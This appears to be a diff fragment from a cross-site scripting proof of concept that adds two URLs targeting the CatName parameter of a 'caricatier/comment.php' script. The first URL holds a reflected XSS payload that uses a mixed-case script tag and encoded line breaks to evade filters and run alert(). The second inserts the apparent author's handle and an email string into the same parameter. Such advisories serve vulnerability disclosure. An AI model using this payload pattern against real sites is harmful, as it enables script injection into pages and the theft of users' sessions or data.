@@ -1,0 +1,2 @@
+http://www.example.com/caricatier/comment.php?op=CatID%3D0&amp;CatName=1&lt;ScRiPt%20%0d%0a&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;&amp;CaricatierID=1
+http://www.example.com/caricatier/comment.php?op=CatID%3D0&amp;CatName=indoushka@hotmail.com-00213771818860&amp;CaricatierID=1
